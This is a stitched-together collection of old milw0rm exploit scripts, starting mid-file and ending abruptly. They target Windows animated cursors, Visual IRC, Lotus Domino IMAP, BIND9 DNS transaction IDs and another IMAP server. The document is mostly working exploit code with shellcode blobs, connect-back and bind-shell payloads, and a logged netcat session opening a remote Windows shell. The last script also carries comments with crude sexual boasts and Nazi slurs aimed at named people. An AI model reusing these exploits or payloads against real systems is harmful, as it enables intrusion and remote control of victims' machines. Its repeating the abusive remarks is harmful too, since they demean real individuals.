tidx = 0

def randstr(count = 1, charset = 'ascii_alpha'):
    # Set the charset
    if charset == 'ascii_alpha':
        charset = digits + ascii_uppercase + ascii_lowercase
    elif charset == 'ascii_letters':
        charset = ascii_letters
    elif charset == 'ascii_lowercase':
        charset = ascii_lowercase
    elif charset == 'ascii_uppercase':
        charset = ascii_uppercase
    elif charset == 'digits':
        charset = digits
    elif charset == 'hexdigits':
        charset = hexdigits
    elif charset == 'octdigits':
        charset = octdigits

    # Create the string
    i = 0
    str = ''

    while i < count:
        str = str + charset[randint(0, len(charset)-1)]
        i = i + 1

    return str


def riff_chunk():
    chunk_id = randstr(4)
    chunk_data = randstr(randint(1, 256)*2)
    chunk_size = pack('<L', len(chunk_data))

    return chunk_id + chunk_size + chunk_data


def riff_ani_file():
    global buf, target, tidx

    # Create the first header subchunk
    anih_a = [36, randint(1, 65535), randint(1, 65535), 0, 0, 0, 0, 0, 1]
    anih_a = pack('<%dL' % len(anih_a), *[i for i in anih_a])
    anih_a = 'anih' + pack('<L', len(anih_a)) + anih_a

    # Create the second header subchunk
    anih_b = randstr(target[tidx]['offset'])

    # Set the current indexed target
    if target[tidx]['len'] == 1:
        anih_b = anih_b + pack('<B', target[tidx]['addr'])
    elif target[tidx]['len'] == 2:
        anih_b = anih_b + pack('<H', target[tidx]['addr'])
    else:
        anih_b = anih_b + pack('<L', target[tidx]['addr'])

    anih_b = 'anih' + pack('<L', len(anih_b)) + anih_b

    # Format ID
    riff = 'ACON'

    # Random subchunks
    for i in range(randint(1, 256)):
        riff = riff + riff_chunk()

    # First header subchunk
    riff = riff + anih_a

    # Random subchunks
    for i in range(randint(1, 256)):
        riff = riff + riff_chunk()

    # Second header subchunk
    riff = riff + anih_b

    # Shellcode
    riff = riff + buf

    # File ID and length of file
    riff = 'RIFF' + pack('<L', len(riff)) + riff

    # Update the target list index
    if tidx < len(target)-1:
        tidx = tidx + 1
    else:
        tidx = 0

    return riff


def randhtml():
    global buf, target, tidx

    # Random RIFF file extensions
    extension = ['ani', 'avi', 'cdr', 'rmi', 'wav']

    # Random html document
    html = \
    '<html>\n<head>\n<title>' + \
    randstr(randint(1, 256)) + \
    '</title>\n</head>\n<body>\n'

    for i in range(randint(0, 4)):
        html = html + randstr(randint(1, 256)) + '\n'

    for i in range(len(target)):
        html = html + \
        '<div id="' + randstr(randint(4, 16)) + '" ' \
        'style="cursor: url(/' + randstr(randint(4, 16)) + '.' + \
        extension[randint(0, len(extension)-1)] + ')">\n'

        for i in range(randint(0, 4)):
            html = html + randstr(randint(1, 256)) + '\n'

        html = html + '</div>\n'

        for i in range(randint(0, 4)):
            html = html + randstr(randint(1, 256)) + '\n'

    html = html + '</body>\n</html>\n'

    return html


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)

        if self.path == '/':
            # Send the html document
            html = randhtml()
            self.send_header('Content-Type', 'text/html; charset=UTF-8')
            self.send_header('Content-Length', str(len(html)))
            self.end_headers()
            self.wfile.write(html)
            return

        # Generate and send the RIFF file
        riff = riff_ani_file()
        self.send_header('Content-Type', 'application/octetstream')
        self.send_header('Content-Length', str(len(riff)))
        self.end_headers()
        self.wfile.write(riff)


def usage():
    print 'Usage: ./%s <http_host> <http_port> <host> <port>' \
    % basename(argv[0])


if __name__ == '__main__':
    print 'Windows Animated Cursor Stack Overflow Exploit'
    print 'Copyright 2007 RISE Security <contact@risesecurity.org>\n'

    args = argv[1:]

    if '-h' in args or '--help' in args:
        usage()
        exit()

    http_host = '0.0.0.0'
    http_port = 8080
    host = '127.0.0.1'
    port = 1234

    try:
        http_host = argv[1]
        http_port = atoi(argv[2])
        host = argv[3]
        port = atoi(argv[4])
    except:
        pass

    # Set shellcode host and port to connect to
    buf = buf[:160] + inet_aton(gethostbyname(host)) + buf[164:]
    buf = buf[:166] + pack('<H', port) + buf[168:]

    # Start the HTTP server
    server_class = HTTPServer
    httpd = server_class((http_host, http_port), RequestHandler)

    print 'Listening on %s:%s' % (http_host, http_port)

    try:
        httpd.serve_forever()
    except:
        pass

# milw0rm.com [2007-06-07]
#!/usr/bin/python
# ViRC 2.0 'JOIN Response' 0day Remote SEH Overwrite PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on Visual IRC 2.0 / 2k SP4 Polish
# Shellcode type: Windows Execute Command (calc.exe)
# How stuff works ? ..
#
# [ViRC] -----> (..JOIN..) -------------> [exploit_tunnel] -----------------------------> [Real IRC server]
# [ViRC] <--- (#channel :AAAAAAA...) <--- [exploit_tunnel] <---- (#channel :nick) <------ [Real IRC server]
#
# Details:
# "#channel :" + "A" * 4116
# 0x41414141  Pointer to next SEH record
# 0x41414141  SE handler
##

from thread import start_new_thread
from struct import pack
from string import find
from string import join
from socket import *

LEN_RECV = 65536

in_addr = '0.0.0.0'        # local address
in_port = 6667             # local port
out_addr = '192.168.0.2'   # address of IRC server
out_port = 6667            # port of IRC server

shellcode = (
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
SE_HANDLER = 0x7CEA41D3       # POP POP RET (SHELL32.DLL / 2k SP4 Polish)

buf = "A" * 4108
buf += pack("<L", NEXT_SEH_RECORD)
buf += pack("<L", SE_HANDLER)
buf += "\x90" * 32
buf += shellcode

class new_plug_in:
   def __init__(self):
       self.sock = 0
       self.send_to = 1
       self.active = 1
       self.plugins = []
       self.description = ''

   def CloseTunnel(self):
       if(self.active == 1):
           self.active = 0
           self.sock.shutdown(1)
           self.sock.close()
           self.plugins[self.send_to].active = 0
           self.plugins[self.send_to].sock.shutdown(1)
           self.plugins[self.send_to].sock.close()

   def Send(self, data):
       try:
           self.sock.send(data)
       except:
           self.CloseTunnel()

   def Recv(self):
       while(1):
           try:
               data = self.sock.recv(LEN_RECV)
               if(len(data) == 0):
                   self.CloseTunnel()
                   return
               print self.description
               print data
               if(self.description == '[SERVER]'):
                   if(find(data, 'JOIN') != -1):
                       data = build_evil_buf(data, buf)
                       if(data == -1):
                           print "Error: Malformed IRC response"
                           self.CloseTunnel()
               self.plugins[self.send_to].Send(data)
           except:
               self.CloseTunnel()
               return

   def Run(self):
       if(len(self.plugins) == 0):
           self.plugins.append(self)
           try:
               s = socket(AF_INET, SOCK_STREAM)
               s.connect((out_addr, out_port))
           except:
               s.close()
               self.sock.close()
               return
           tunnel_out = new_plug_in()
           tunnel_out.sock = s
           tunnel_out.send_to = 0
           self.plugins.append(tunnel_out)
           self.description = '[CLIENT]'
           tunnel_out.description = '[SERVER]'
           tunnel_out.plugins = self.plugins
           tunnel_out.Run()
       start_new_thread(self.Recv, ())

def build_evil_buf(data, buf):
   try:
       lines = data.split('\r\n')
       tmp = lines[1].split('\x20:')
       tmp[1] = buf
       lines[1] = join(tmp, "\x20:")
       return join(lines, "\r\n")
   except:
       return -1

def AcceptConnect(cl, addr):
   print "Connection accepted from: %s" % (addr[0])
   tunnel_in = new_plug_in()
   tunnel_in.sock = cl
   tunnel_in.Run()

def InitServer(bind_addr, bind_port):
   s = socket(AF_INET, SOCK_STREAM)
   s.bind((bind_addr, bind_port))
   print "Listening on %s:%d..." % (bind_addr, bind_port)
   s.listen(1)
   while(1):
       cl, addr = s.accept()
       start_new_thread(AcceptConnect, (cl, addr,))
   s.close()

InitServer(in_addr, in_port)

# EoF

# milw0rm.com [2007-07-06]
###########################################################################################
# Lotus Domino IMAP4 Server Release 6.5.4 / Windows 2000 Advanced Server x86 Remote Exploit
###########################################################################################
# Vulnerable: IBM Lotus Domino <= 7.0.2 && 6.5.5 FP2 (tested 6.5.4)
# Authors: Dominic Chell <dmc@digitalapocalypse.net> & prdelka
#
# Exploitation steps:
# 1) The instruction "call dword [ecx]" is performed with user supplied ECX
# 2) EAX reference our buffer from retaddr onward
# 3) we put pointer in ECX to a pointer referencing "call eax"
# 4) a small payload decrements eax and then jmp's into the eax buffer due
#    to size limitations.
# 5) our larger payload is then executed.
#
# muts exploit would not work for us, his egghunt uses 0x2e which is converted
# to 0x09 (.'s to [tab]'s) and his return address was not found on our test
# environment.
#
# Finding a Target:
# To find a target, attach a debugger to nimap.exe, cause the application
# to crash. Then use search function to find "call eax" or equivilant
# instruction in memory. Then, take the pointer to eax, such as "0x77ff1122"
# and search for another location in memory that has "0x11 0xff 0x77". This
# will be utilised for a return address if no instruction modify eax or
# subvert execution to another place in memory.
#
# Thanks to: nemo, hdm, jf, Winny Thomas, muts
#
###########################################################################################
# Note: it takes a few minutes for the egghunter to find the payload in memory
#
# For example:
# C:\work\exploits\imap>poc.py
# [*] sending payload
# [*] sending payload
# [*] sending payload
# [*] sending payload
# * OK Domino IMAP4 Server Release 6.5.4 ready Tue, 26 Jun 2007 15:18:36 +0100
#
# PDAwNEU5QkNCLjgwMjU3MzA2LjAwMDAwOUY4LjAwMDAwMDA5QERNQz4=
#
# sending...
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkNvS2XQk9FgpybEKu3E1If4xWBcDWBeDmcnDC2rgYnVG+2Q3
# BG5572VAQQov6VasmyGZmqi4dlFEk/x9Zwv0gcDrZXeQkJCD6FKD6FKD6FL/4CB4OcnLXAvHq421
# M2iR5FFG
#
#
# C:\work\exploits\imap>nc -vv 192.168.126.130 4444
# 2KVM-DC [192.168.126.130] 4444 (?) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-1999 Microsoft Corp.
#
# E:\Lotus\Domino>
#
###########################################################################################

import socket, struct, md5, base64, sys, string, signal, getopt


class Exp_Lotus:
       def __init__(self):
               self.host='127.0.0.1'
               self.port=143


def send_payload(host,port):
       payload ="\x54\x30\x30\x57\x54\x30\x30\x57"
       payload += ("\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7"
       "\x82\xf8\x80\x83\xeb\xfc\xe2\xf4\x0b\xe8\x13\xcd\x1f\x7b\x07\x7f"
       "\x08\xe2\x73\xec\xd3\xa6\x73\xc5\xcb\x09\x84\x85\x8f\x83\x17\x0b"
       "\xb8\x9a\x73\xdf\xd7\x83\x13\xc9\x7c\xb6\x73\x81\x19\xb3\x38\x19"
       "\x5b\x06\x38\xf4\xf0\x43\x32\x8d\xf6\x40\x13\x74\xcc\xd6\xdc\xa8"
       "\x82\x67\x73\xdf\xd3\x83\x13\xe6\x7c\x8e\xb3\x0b\xa8\x9e\xf9\x6b"
       "\xf4\xae\x73\x09\x9b\xa6\xe4\xe1\x34\xb3\x23\xe4\x7c\xc1\xc8\x0b"
       "\xb7\x8e\x73\xf0\xeb\x2f\x73\xc0\xff\xdc\x90\x0e\xb9\x8c\x14\xd0"
       "\x08\x54\x9e\xd3\x91\xea\xcb\xb2\x9f\xf5\x8b\xb2\xa8\xd6\x07\x50"
       "\x9f\x49\x15\x7c\xcc\xd2\x07\x56\xa8\x0b\x1d\xe6\x76\x6f\xf0\x82"
       "\xa2\xe8\xfa\x7f\x27\xea\x21\x89\x02\x2f\xaf\x7f\x21\xd1\xab\xd3"
       "\xa4\xd1\xbb\xd3\xb4\xd1\x07\x50\x91\xea\xe9\xdc\x91\xd1\x71\x61"
       "\x62\xea\x5c\x9a\x87\x45\xaf\x7f\x21\xe8\xe8\xd1\xa2\x7d\x28\xe8"
       "\x53\x2f\xd6\x69\xa0\x7d\x2e\xd3\xa2\x7d\x28\xe8\x12\xcb\x7e\xc9"
       "\xa0\x7d\x2e\xd0\xa3\xd6\xad\x7f\x27\x11\x90\x67\x8e\x44\x81\xd7"
       "\x08\x54\xad\x7f\x27\xe4\x92\xe4\x91\xea\x9b\xed\x7e\x67\x92\xd0"
       "\xae\xab\x34\x09\x10\xe8\xbc\x09\x15\xb3\x38\x73\x5d\x7c\xba\xad"
       "\x09\xc0\xd4\x13\x7a\xf8\xc0\x2b\x5c\x29\x90\xf2\x09\x31\xee\x7f"
       "\x82\xc6\x07\x56\xac\xd5\xaa\xd1\xa6\xd3\x92\x81\xa6\xd3\xad\xd1"
       "\x08\x52\x90\x2d\x2e\x87\x36\xd3\x08\x54\x92\x7f\x08\xb5\x07\x50"
       "\x7c\xd5\x04\x03\x33\xe6\x07\x56\xa5\x7d\x28\xe8\x07\x08\xfc\xdf"
       "\xa4\x7d\x2e\x7f\x27\x82\xf8\x80")

       try:
               s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               connect=s.connect((host,port))
               d=s.recv(1024)
               print "[*] sending payload"
               s.send('a001 admin ' + payload + '\r\n')
               d=s.recv(1024)
               s.close()
       except:
               "Can't connect to IMAP server"

def usage():
       print sys.argv[0] + "\n\n\tLotus Domino 6.5.4 Windows 2000 Advanced Server x86 Exploit\n\tauthor: dmc@digitalapocalypse.net & prdelka"
       print "\t-h host"
       print "\t-p port"
       sys.exit(2)

def signal_handler(signal, frame):
       print 'err: caught sigint, exiting'
       sys.exit(0)

def exp(host, port):
       buffer = "\x90" * 193
       buffer += ("\xdb\xd2\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x0a\xbb\x71\x35\x21"
       "\xfe\x31\x58\x17\x03\x58\x17\x83\x99\xc9\xc3\x0b\x6a\xe0\x62"
       "\x75\x46\xfb\x64\x37\x04\x6e\x79\xef\x65\x40\x41\x0a\x2f\xe9"
       "\x56\xac\x9b\x21\x99\x9a\xa8\xb8\x76\x51\x44\x93\xfc\x7d\x67"
       "\x0b\xf4\x81")

       try:
               s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               connect=s.connect((host,port))
               d=s.recv(1024)
               print d
               s.send('a001 authenticate cram-md5\r\n')
               d=s.recv(1024)
               d=d[2:1022].strip()
               print d
               m=md5.new()
               m.update(d)
               digest = m.digest()
               buffer += struct.pack('<L',  0x7765ebc0) # call eax 6014DC6E (ptr to 6014DC68)
               buffer += "\x90\x90\x90\x83\xE8\x52\x83\xE8\x52\x83\xE8\x52\xFF\xE0"
               buffer = buffer + ' ' + digest
               s.send(base64.encodestring(buffer) + '\r\n')
               print "\nsending...\n", base64.encodestring(buffer) , '\r\n'
       except:
               "Can't connect to IMAP server"

def main(argv=None):

       if argv is None:
               argv = sys.argv[1:]
       if not argv:
               usage()

       try:
               opts, args = getopt.getopt(argv, 'h:p:')
       except getopt.GetoptError:
               usage()

       signal.signal(signal.SIGINT, signal_handler)

       ex = Exp_Lotus()

       for o, a in opts:
               if o == '-h': ex.host=a.strip()
               elif o =='-p': ex.port = int(a)

       host = ex.host
       port = ex.port

       send_payload(host,port)
       send_payload(host,port)
       send_payload(host,port)
       send_payload(host,port)
       exp(host, port)

if __name__ == '__main__':
       main()

# milw0rm.com [2007-07-20]
#!/usr/bin/env python

"""
DNS Cache Poison v0.3beta by posedge
based on the Amit Klein paper: http://www.trusteer.com/docs/bind9dns.html

output: <time>:<ip>:<port>: id: <id> q: <query> g: <good> e: <error>

id: ID to predict
q: number of queries from the DNS server (only queries with LSB at 0 in ID)
g: number of good predicted IDs
e: number of errors while trying to predict a *supposed to be* predicted ID
"""

import socket, select, sys, time
from struct import unpack, pack
from socket import htons

_ANSWER_TIME_LIMIT = 1.0 # 1sec
_NAMED_CONF = [[<your_dns1_hostname>, <your_dns1_ip>], \
               [<your_dns2_hostname>, <your_dns2_ip>], \
               [<etc>, <etc>]]

class BINDSimplePredict:
  def __init__(self, txid, bind_9_2_3___9_4_1=True):
    self.txid = txid
    self.cand = []
    if bind_9_2_3___9_4_1 == True:
      # For BIND9 v9.2.3-9.4.1:
      self.tap1=0x80000057
      self.tap2=0x80000062
    else:
      # For BIND9 v9.0.0-9.2.2:
      self.tap1=0xc000002b # (0x80000057>>1)|(1<<31)
      self.tap2=0xc0000061 # (0x800000c2>>1)|(1<<31)
    self.next = self.run()
    return

  def run(self):

    if (self.txid & 1) != 0:
      #print "info: LSB is not 0. Can't predict the next transaction ID."
      return False
  
    #print "info: LSB is 0, predicting..."
  
    # One bit shift (assuming the two lsb's are 0 and 0)
    for msb in xrange(0, 2):
      self.cand.append(((msb<<15)|(self.txid>>1)) & 0xFFFF)
  
    # Two bit shift (assuming the two lsb's are 1 and 1)
    # First shift (we know the lsb is 1 in both LFSRs):
    v=self.txid
    v=(v>>1)^self.tap1^self.tap2
    if (v & 1) == 0:
      # After the first shift, the lsb becomes 0, so the two LFSRs now have
      # identical lsb's: 0 and 0 or 1 and 1
      # Second shift:
      v1=(v>>1) # 0 and 0
      v2=(v>>1)^self.tap1^self.tap2 # 1 and 1
    else:
      # After the first shift, the lsb becomes 1, so the two LFSRs now have
      # different lsb's: 1 and 0 or 0 and 1
      # Second shift:
      v1=(v>>1)^self.tap1 # 1 and 0
      v2=(v>>1)^self.tap2 # 0 and 1
  
    # Also need to enumerate over the 2 msb's we are clueless about
    for msbits in xrange(0, 4):
      self.cand.append(((msbits<<14)|v1) & 0xFFFF)
      self.cand.append(((msbits<<14)|v2) & 0xFFFF)

    return True;
  
class DNSData:
  def __init__(self, data):
    self.data=data
    self.name=''

    for i in xrange(12, len(data)):
      self.name+=data[i]
      if data[i] == '\x00':
        break
    q_type = unpack(">H", data[i+1:i+3])[0]
    if q_type != 1: # only type: A (host address) allowed.
      self.name = None
    return

  def response(self, ip=None):
    packet=''
    packet+=self.data[0:2] # id
    packet+="\x84\x10" # flags
    packet+="\x00\x01" # questions
    packet+="\x00\x01" # answer RRS
    packet+="\x00\x00" # authority RRS
    packet+="\x00\x00" # additional RRS
    packet+=self.name # queries: name
    packet+="\x00\x01" # queries: type (A)
    packet+="\x00\x01" # queries: class (IN)
    packet+="\xc0\x0c" # answers: name
    if ip == None:
      packet+="\x00\x05" # answers: type (CNAME)
      packet+="\x00\x01" # answers: class (IN)
      packet+="\x00\x00\x00\x01" # answers: time to live (1sec)
      packet+=pack(">H", len(self.name)+2) # answers: data length
      packet+="\x01" + "x" + self.name # answers: primary name
    else:
      packet+="\x00\x01" # answers: type (A)
      packet+="\x00\x01" # answers: class (IN)
      packet+="\x00\x00\x00\x01" # answers: time to live (1sec)
      packet+="\x00\x04" # answers: data length
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # IP
    #packet+="\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00" # Additional
    return packet

class DNSServer:
  def __init__(self):
    self.is_r = []
    self.is_w = []
    self.is_e = []
    self.targets = []
    self.named_conf = []
    
    for i in xrange(len(_NAMED_CONF)):
      start = 0
      tmp = ''
      for j in xrange(len(_NAMED_CONF[i][0])):
        if _NAMED_CONF[i][0][j] == '.':
          tmp += chr(j - start)
          tmp += _NAMED_CONF[i][0][start:j]
          start = j + 1
      tmp += chr(j - start + 1)
      tmp += _NAMED_CONF[i][0][start:] + "\x00"
      self.named_conf.append([tmp, _NAMED_CONF[i][1]])
    return

  def run(self):
    self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    self.s.bind(('',53))
    self.is_r.append(self.s)
    next = False
    i = 0

    while 1:
      r, w, e = select.select(self.is_r, self.is_w, self.is_e, 1.0)
      if r:
        try:
          data, addr = self.s.recvfrom(1024)
        except socket.error:
          continue

        txid = unpack(">H", data[0:2])[0]
        p=DNSData(data)
        if p.name == None:
          continue

        found = False

        for j in xrange(len(self.named_conf)):
          if p.name == self.named_conf[j][0]:
            found = True
            break

        if found == True:
          self.s.sendto(p.response(self.named_conf[j][1]), addr)
          continue

        # FIXME: wrong code, 'i' is 0 at begin and when 1 item in list...
        for i in xrange(len(self.targets)):
          if self.targets[i][0] == addr[0]:
            break
        if i == len(self.targets):
          self.targets.append([addr[0], False, time.time(), [None, None], \
            None, 0, 0, 0])

        if self.targets[i][1] == False:
          bsp = BINDSimplePredict(txid)
          self.targets[i][1] = bsp.next
          self.targets[i][3][0] = bsp.cand
          bsp = BINDSimplePredict(txid, False)
          self.targets[i][3][1] = bsp.cand
        else:
          if p.name == self.targets[i][4]:
            elapsed = time.time() - self.targets[i][2]
            if elapsed > _ANSWER_TIME_LIMIT:
              print 'info: slow answer, discarding (%.2f sec)' % elapsed
            else:
              self.targets[i][5] += 1
              found_v1 = False
              found_v2 = False
              for j in xrange(10):
                if self.targets[i][3][0][j] == txid:
                  found_v1 = True
                  break
                if self.targets[i][3][1][j] == txid:
                  found_v2 = True
                  break

              if found_v1 == True or found_v2 == True:
                self.targets[i][6] += 1
              else:
                self.targets[i][7] += 1

              # TODO: if found_v1 or found_v2 is True, then show bind version!
              print "\n" + str(i) + ' target:', self.targets
              print '%f:%s:%d: id: %04x q: %d g: %d e: %d' % (time.time(), \
                addr[0], addr[1], txid, self.targets[i][5], \
                self.targets[i][6], self.targets[i][7])
              self.targets[i][1] = False
        self.targets[i][2] = time.time()
        self.targets[i][4] = "\x01" + "x" + p.name
        self.s.sendto(p.response(), addr)
    return

  def close(self):
    self.s.close()
    return

if __name__ == '__main__':
  dns_srv = DNSServer()

  try:
    dns_srv.run()
  except KeyboardInterrupt:
    print 'ctrl-c, leaving...'
    dns_srv.close()

# milw0rm.com [2007-08-07]
#!/usr/bin/python

import os
import sys
import time
import socket
import struct

#this is imap exploit

#710 bytes, tcp port 9999 bind, borrowed from skape miller inventor of megacanvas
sc  = "\x90"
sc += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xeb\x03\x59"
sc += "\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49\x49\x49\x49"
sc += "\x49\x49\x49\x49\x49\x49\x49\x49\x51\x37\x5a\x6a\x66\x58\x50\x30"
sc += "\x41\x31\x42\x41\x6b\x41\x41\x76\x41\x32\x41\x41\x32\x42\x41\x30"
sc += "\x42\x41\x58\x50\x38\x41\x42\x75\x79\x79\x4b\x4c\x32\x4a\x7a\x4b"
sc += "\x42\x6d\x78\x68\x4c\x39\x4b\x4f\x4b\x4f\x4b\x4f\x75\x30\x6e\x6b"
sc += "\x42\x4c\x45\x74\x71\x34\x6c\x4b\x41\x55\x57\x4c\x4e\x6b\x33\x4c"
sc += "\x53\x35\x51\x68\x55\x51\x68\x6f\x4c\x4b\x72\x6f\x56\x78\x6e\x6b"
sc += "\x61\x4f\x77\x50\x76\x61\x38\x6b\x52\x69\x4e\x6b\x36\x54\x4e\x6b"
sc += "\x67\x71\x4a\x4e\x76\x51\x4f\x30\x6d\x49\x4e\x4c\x4d\x54\x4b\x70"
sc += "\x41\x64\x43\x37\x4b\x71\x6b\x7a\x76\x6d\x54\x41\x4f\x32\x7a\x4b"
sc += "\x6a\x54\x45\x6b\x33\x64\x56\x44\x77\x58\x34\x35\x6b\x55\x4c\x4b"
sc += "\x61\x4f\x46\x44\x55\x51\x58\x6b\x31\x76\x6c\x4b\x46\x6c\x30\x4b"
sc += "\x4e\x6b\x61\x4f\x75\x4c\x64\x41\x38\x6b\x53\x33\x54\x6c\x4c\x4b"
sc += "\x6d\x59\x50\x6c\x64\x64\x55\x4c\x30\x61\x6b\x73\x74\x71\x4b\x6b"
sc += "\x51\x74\x4c\x4b\x51\x53\x70\x30\x4c\x4b\x77\x30\x36\x6c\x4c\x4b"
sc += "\x72\x50\x35\x4c\x4e\x4d\x6c\x4b\x73\x70\x57\x78\x31\x4e\x42\x48"
sc += "\x4e\x6e\x50\x4e\x76\x6e\x5a\x4c\x30\x50\x6b\x4f\x49\x46\x75\x36"
sc += "\x56\x33\x53\x56\x75\x38\x37\x43\x34\x72\x35\x38\x74\x37\x54\x33"
sc += "\x44\x72\x63\x6f\x71\x44\x4b\x4f\x7a\x70\x42\x48\x38\x4b\x38\x6d"
sc += "\x6b\x4c\x47\x4b\x30\x50\x4b\x4f\x4e\x36\x51\x4f\x4f\x79\x4d\x35"
sc += "\x42\x46\x4b\x31\x7a\x4d\x33\x38\x57\x72\x76\x35\x61\x7a\x46\x62"
sc += "\x4b\x4f\x6e\x30\x51\x78\x4b\x69\x67\x79\x59\x65\x6c\x6d\x41\x47"
sc += "\x4b\x4f\x6e\x36\x41\x43\x56\x33\x76\x33\x52\x73\x70\x53\x51\x53"
sc += "\x70\x53\x32\x63\x32\x73\x6b\x4f\x4e\x30\x41\x76\x62\x48\x36\x47"
sc += "\x54\x4f\x41\x76\x72\x73\x4f\x79\x49\x71\x4e\x75\x31\x78\x6e\x44"
sc += "\x67\x6a\x64\x30\x4f\x37\x70\x57\x69\x6f\x6e\x36\x70\x6a\x74\x50"
sc += "\x62\x71\x73\x65\x4b\x4f\x38\x50\x62\x48\x4c\x64\x4e\x4d\x64\x6e"
sc += "\x58\x69\x62\x77\x4b\x4f\x7a\x76\x50\x53\x51\x45\x39\x6f\x58\x50"
sc += "\x71\x78\x6b\x55\x53\x79\x6f\x76\x53\x79\x36\x37\x39\x6f\x79\x46"
sc += "\x72\x70\x61\x44\x33\x64\x62\x75\x59\x6f\x48\x50\x4a\x33\x51\x78"
sc += "\x6d\x37\x71\x69\x79\x56\x71\x69\x70\x57\x6b\x4f\x6e\x36\x51\x45"
sc += "\x69\x6f\x6e\x30\x45\x36\x63\x5a\x41\x74\x35\x36\x72\x48\x30\x63"
sc += "\x50\x6d\x6f\x79\x59\x75\x63\x5a\x52\x70\x43\x69\x37\x59\x58\x4c"
sc += "\x4f\x79\x79\x77\x52\x4a\x33\x74\x4d\x59\x39\x72\x55\x61\x4f\x30"
sc += "\x7a\x53\x6d\x7a\x79\x6e\x47\x32\x76\x4d\x69\x6e\x47\x32\x34\x6c"
sc += "\x6d\x43\x6c\x4d\x72\x5a\x54\x78\x4e\x4b\x4c\x6b\x6c\x6b\x75\x38"
sc += "\x52\x52\x4b\x4e\x4e\x53\x55\x46\x79\x6f\x71\x65\x41\x54\x59\x6f"
sc += "\x4e\x36\x43\x6b\x71\x47\x51\x42\x52\x71\x62\x71\x52\x71\x51\x7a"
sc += "\x33\x31\x56\x31\x46\x31\x51\x45\x50\x51\x59\x6f\x4e\x30\x50\x68"
sc += "\x4c\x6d\x6e\x39\x53\x35\x6a\x6e\x62\x73\x49\x6f\x5a\x76\x50\x6a"
sc += "\x59\x6f\x4b\x4f\x34\x77\x59\x6f\x5a\x70\x6c\x4b\x32\x77\x39\x6c"
sc += "\x6c\x43\x4b\x74\x61\x74\x6b\x4f\x6a\x76\x50\x52\x79\x6f\x6e\x30"
sc += "\x42\x48\x7a\x4f\x6a\x6e\x59\x70\x63\x50\x42\x73\x4b\x4f\x48\x56"
sc += "\x79\x6f\x4e\x30\x66"


def Copulate(target,port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
	return s

def Fascism(target,u,p):
	safe_readable_null = 0x71c010e4 # Safe readable, preferably null (ws2_32 on win2k3)
	safe_writable = 0x0fff7004 # Safe writable (rsaenh.dll data section on win2k3)
	pop_then_ret = 0x77e41a26 # EIP (pop, ret in kernel32 on win2k3)
	call_esp = 0x77e839b3 # Return #2, call esp in kernel32. When hit, esp points at the next 4 bytes.
	s = Copulate(target,143)
	pkt = "0001 LOGIN \""
	pkt += u
	pkt += "\" \""
	pkt += p
	pkt += "\"\r\n"
	SendPacket(s,pkt)
	pkt = "0003 SELECT \"Inbox\"\r\n"
	SendPacket(s,pkt)
	pkt = "C284 SEARCH "
	pkt += "P"*1008
	pkt += struct.pack('<L',safe_readable_null)
	pkt += "CUNT" # Word used to describe members of the infosec community.
	pkt += struct.pack('<L',pop_then_ret)
	pkt += struct.pack('<L',safe_writable)
	pkt += struct.pack('<L',call_esp)
	pkt += "A"*198 # I have boned over 198 bitches
	pkt += "\xeb\x10" # Body Mass Index of Gadi Evron, hexadecimal LOLOLOLOL
	pkt += struct.pack('<L',safe_readable_null)
	pkt += "A"*16 # Unnecessary megathropic nopsled, invented by k2, founding member of n3td3v
	pkt += sc
	pkt += " (SAVE MIN) SINCE 12-Feb-1992 NOT FROM \"Len Rose The Moderating Nazi of Full Disclosure, Original Founder of Zyklon B\"\r\n"
	print "Sending. Hold on."
	SendPacket(s,pkt)
	time.sleep(3)
	print "The service will continue functioning but cannot be exploited again until restart."
	print "Please telnet to port 9999 on it now for a rootshell."
	print "		-management"
	s.close()

def SendPacket(s,pkt):
        s.send(pkt) # comment

